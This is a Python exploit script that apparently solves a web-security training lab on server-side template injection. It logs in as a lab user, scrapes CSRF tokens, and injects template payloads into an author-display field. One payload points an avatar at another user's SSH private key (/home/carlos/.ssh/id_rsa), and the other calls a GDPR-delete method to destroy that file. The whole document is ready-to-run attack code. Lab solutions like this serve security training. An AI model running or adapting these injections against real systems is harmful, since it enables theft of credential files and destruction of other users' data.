# Server-side template injection with a custom exploit

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################


def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def connect_user(s, url):
	print('\n[+] Trying to connect as Wiener user...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	csrf = get_csrf_token(r)
	login_path = url + '/login'
	connect_data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=connect_data)
	if 'Your username is: wiener' in r.text:
		print('[+] Connected as %s user !' % connect_data['username'])
		return r
	elif 'Account disabled!' in r.text:
		print("[-] The Wiener's account has already been disabled <!>")
		print("[-] The vulnerable feature seems to be broken <!>")

	return False

def post_comment(s, url):
	print("\n[+] Trying to post a comment on the target website...")
	comment_path = url + '/post/comment'
	post_path = url + '/post?postId=1'
	r = s.get(post_path)
	if r.status_code == 500:
		print("[-] The vulnerable feature seems to be broken <!>")
		return False
	csrf = get_csrf_token(r)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	comment_data = {'postId': '1', 'comment': 'gwyo', 'csrf': csrf}
	r = s.post(comment_path, data=comment_data, headers=headers)
	return r

def change_avatar(s, url):
	account_path = url + '/my-account'
	session = s.cookies.get('session')
	print('[+] Found session cookie:\t%s' % session)
	r = s.get(account_path)
	csrf_token = get_csrf_token(r)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	inject_path = url + '/my-account/change-blog-post-author-display'
	payload = """user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')"""
	inject_data = 'blog-post-author-display=' +  payload + '&csrf=' + csrf_token
	print("\n[+] Trying to inject payload '%s' on the target website..." % payload)
	print(f"[+] Sending post request on {inject_path}\n")
	r = s.post(inject_path, data=inject_data, headers=headers)
	time.sleep(1)
	if r.status_code == 200:
		return r
	else:
		if r.status_code == 500:
			print("[-] The vulnerable feature seems to be broken <!>")
			return False
		print("[-] Command Injection Failed !!!")

def delete_avatar(s, url):
	account_path = url + '/my-account'
	session = s.cookies.get('session')
	print('[+] Found session cookie:\t%s' % session)
	r = s.get(account_path)
	csrf_token = get_csrf_token(r)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	inject_path = url + '/my-account/change-blog-post-author-display'
	payload = """user.gdprDelete()"""
	inject_data = 'blog-post-author-display=' +  payload + '&csrf=' + csrf_token
	print("\n[+] Trying to inject payload '%s' on the target website..." % payload)
	print(f"[+] Sending post request on {inject_path}\n")
	r = s.post(inject_path, data=inject_data, headers=headers)
	time.sleep(1)
	if r.status_code == 200:
		return r
	else:
		if r.status_code == 500:
			print("[-] The vulnerable feature seems to be broken <!>")
			return False
		print("[-] Command Injection Failed !!!")

##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: Server-side template injection with a custom exploit')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host

			r = connect_user(s, url)
			time.sleep(2)

			r = post_comment(s, url)
			time.sleep(2)

			print("\n[+] Trying to change Wiener's avatar to point on Carlos's id_rsa...")
			r = change_avatar(s, url)
			time.sleep(2)

			comment_path = url + '/post?postId=1'
			r = s.get(comment_path)
			if not 'gwyo' in r.text:
				print("[-] Failed to retrieve our comment <!>")
				if r.status_code == 500:
					print("[-] The vulnerable feature seems to be broken <!>")
				sys.exit(0)

			print("\n[+] Trying to delete Wiener's avatar and Carlos's id_rsa...")
			delete_avatar(s, url)
			time.sleep(2)

			print("\n[+] Trying to load post to trigger the payload and delete Carlos's id_rsa...")
			r = s.get(comment_path)			
			time.sleep(2)

			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()